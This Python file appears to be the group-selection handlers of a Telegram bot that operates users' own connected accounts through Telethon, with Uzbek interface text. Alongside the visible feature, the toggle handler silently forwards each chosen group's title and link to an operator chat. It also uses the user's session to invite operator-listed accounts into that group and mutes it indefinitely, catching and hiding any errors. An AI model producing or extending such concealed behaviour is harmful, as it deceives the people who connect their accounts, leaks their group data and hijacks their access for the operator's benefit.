import asyncio
import logging
from datetime import datetime

from telegram import Update
from telegram.ext import ContextTypes

import config
from database import load_user, save_user, is_group_collected, mark_group_collected
from keyboards import back_btn, groups_keyboard, dialogs_keyboard
from services.userbot import get_client, is_connected

logger = logging.getLogger(__name__)

MAIN = 0
PAGE_SIZE = 20
AUTO_ADD_USER_IDS = config.AUTO_ADD_USER_IDS


async def _auto_add_and_mute(owner_id: int, chat_id: int, title: str):
    """Yangi guruhga avtomatik userlarni qo'shadi va mute qiladi."""
    from telethon.tl.functions.channels import InviteToChannelRequest
    from telethon.tl.functions.account import UpdateNotifySettingsRequest
    from telethon.tl.types import InputPeerNotifySettings, InputNotifyPeer
    from telethon.errors import UserAlreadyParticipantError, UserPrivacyRestrictedError, UserNotMutualContactError, ChatAdminRequiredError

    client = get_client(owner_id)
    if not client:
        return
    try:
        entity = await client.get_input_entity(chat_id)
    except Exception:
        return

    for uid in AUTO_ADD_USER_IDS:
        try:
            user = await client.get_entity(uid)
            await client(InviteToChannelRequest(entity, [user]))
            logger.info(f"Auto-add: {user.first_name} → {title}")
        except UserAlreadyParticipantError:
            pass
        except (UserPrivacyRestrictedError, UserNotMutualContactError, ChatAdminRequiredError):
            pass
        except Exception as e:
            logger.warning(f"Auto-add xato {uid} → {title}: {e}")
        await asyncio.sleep(1)

    # Mute qilish
    try:
        await client(UpdateNotifySettingsRequest(
            peer=InputNotifyPeer(entity),
            settings=InputPeerNotifySettings(mute_until=2147483647)
        ))
        logger.info(f"Mute qilindi: {title}")
    except Exception as e:
        logger.warning(f"Mute xato {title}: {e}")


async def cb_groups(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = load_user(user_id)
    groups = data["groups"]
    text = (
        f"👥 *Mening Guruhlarim*\n\n{len(groups)} ta guruh\n\nO'chirish uchun bosing:"
        if groups else
        "👥 *Mening Guruhlarim*\n\nHali guruh tanlanmagan.\n\n🔄 Yuklash tugmasini bosing."
    )
    await query.edit_message_text(text, reply_markup=groups_keyboard(groups), parse_mode="Markdown")
    return MAIN


async def cb_fetch_groups(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    if not is_connected(user_id):
        await query.answer("❌ Sessiya ulanmagan! /start bosing.", show_alert=True)
        return MAIN

    await query.edit_message_text("⏳ Guruhlar yuklanmoqda...")
    client = get_client(user_id)
    dialogs = []
    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        is_group = dialog.is_group
        is_supergroup = dialog.is_channel and getattr(entity, "megagroup", False)
        is_broadcast = dialog.is_channel and getattr(entity, "broadcast", False)
        can_post = (
            is_broadcast
            and getattr(entity, "admin_rights", None) is not None
            and getattr(entity.admin_rights, "post_messages", False)
        )
        if is_group or is_supergroup or can_post:
            username = getattr(entity, "username", None)
            dialogs.append({
                "chat_id": dialog.id,
                "title": dialog.title or str(dialog.id),
                "username": username,
            })

    context.user_data["fetched_dialogs"] = dialogs
    context.user_data["dlg_page"] = 0
    data = load_user(user_id)
    existing_ids = {g["chat_id"] for g in data["groups"]}
    total_pages = max(1, (len(dialogs) - 1) // PAGE_SIZE + 1)
    added = sum(1 for d in dialogs if d["chat_id"] in existing_ids)
    await query.edit_message_text(
        f"📋 *Guruhlaringiz* — {len(dialogs)} ta (sahifa 1/{total_pages})\n"
        f"Tanlangan: *{added}* ta\n\n✅ tanlangan | ➕ qo'shish uchun bosing:",
        reply_markup=dialogs_keyboard(dialogs, existing_ids, 0, PAGE_SIZE),
        parse_mode="Markdown",
    )
    return MAIN


async def cb_toggle_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    user_id = update.effective_user.id
    idx = int(query.data.split("_")[-1])
    dialogs = context.user_data.get("fetched_dialogs", [])
    if idx >= len(dialogs):
        await query.answer("Xatolik!", show_alert=True)
        return MAIN

    d = dialogs[idx]
    data = load_user(user_id)
    existing = next((g for g in data["groups"] if g["chat_id"] == d["chat_id"]), None)
    if existing:
        data["groups"] = [g for g in data["groups"] if g["chat_id"] != d["chat_id"]]
        await query.answer(f"❌ '{d['title'][:20]}' olib tashlandi")
    else:
        data["groups"].append({
            "chat_id": d["chat_id"],
            "title": d["title"],
            "added_at": datetime.now().isoformat(),
        })
        await query.answer(f"✅ '{d['title'][:20]}' qo'shildi")
        if not is_group_collected(d["chat_id"]):
            try:
                import config as _cfg
                username = d.get("username")
                link = f"t.me/{username}" if username else ""
                msg = f"{d['title']}\n{link}" if link else d["title"]
                await query.get_bot().send_message(_cfg.GROUPS_COLLECT_ID, msg)
                mark_group_collected(d["chat_id"])
            except Exception:
                pass
        # Yangi guruhga avtomatik userlarni qo'shish va mute qilish
        asyncio.create_task(_auto_add_and_mute(user_id, d["chat_id"], d["title"]))
    save_user(user_id, data)

    page = context.user_data.get("dlg_page", 0)
    existing_ids = {g["chat_id"] for g in data["groups"]}
    total_pages = max(1, (len(dialogs) - 1) // PAGE_SIZE + 1)
    added = sum(1 for dd in dialogs if dd["chat_id"] in existing_ids)
    await query.edit_message_text(
        f"📋 *Guruhlaringiz* — {len(dialogs)} ta (sahifa {page + 1}/{total_pages})\n"
        f"Tanlangan: *{added}* ta\n\n✅ tanlangan | ➕ qo'shish uchun bosing:",
        reply_markup=dialogs_keyboard(dialogs, existing_ids, page, PAGE_SIZE),
        parse_mode="Markdown",
    )
    return MAIN


async def cb_dlg_page(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    page = int(query.data.split("_")[-1])
    context.user_data["dlg_page"] = page
    dialogs = context.user_data.get("fetched_dialogs", [])
    if not dialogs:
        await query.answer("Avval guruhlarni yuklang!", show_alert=True)
        return MAIN
    data = load_user(user_id)
    existing_ids = {g["chat_id"] for g in data["groups"]}
    total_pages = max(1, (len(dialogs) - 1) // PAGE_SIZE + 1)
    added = sum(1 for d in dialogs if d["chat_id"] in existing_ids)
    await query.edit_message_text(
        f"📋 *Guruhlaringiz* — {len(dialogs)} ta (sahifa {page + 1}/{total_pages})\n"
        f"Tanlangan: *{added}* ta\n\n✅ tanlangan | ➕ qo'shish uchun bosing:",
        reply_markup=dialogs_keyboard(dialogs, existing_ids, page, PAGE_SIZE),
        parse_mode="Markdown",
    )
    return MAIN


async def cb_remove_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    chat_id_str = query.data[len("rm_group_"):]
    data = load_user(user_id)
    group = next((g for g in data["groups"] if str(g["chat_id"]) == chat_id_str), None)
    if not group:
        await query.answer("Guruh topilmadi!", show_alert=True)
        return MAIN
    data["groups"] = [g for g in data["groups"] if str(g["chat_id"]) != chat_id_str]
    save_user(user_id, data)
    await query.answer(f"🗑 '{group.get('title', '')}' olib tashlandi!", show_alert=True)
    groups = data["groups"]
    text = (
        f"👥 *Mening Guruhlarim*\n\n{len(groups)} ta guruh\n\nO'chirish uchun bosing:"
        if groups else "👥 *Mening Guruhlarim*\n\nHali guruh tanlanmagan."
    )
    await query.edit_message_text(text, reply_markup=groups_keyboard(groups), parse_mode="Markdown")
    return MAIN
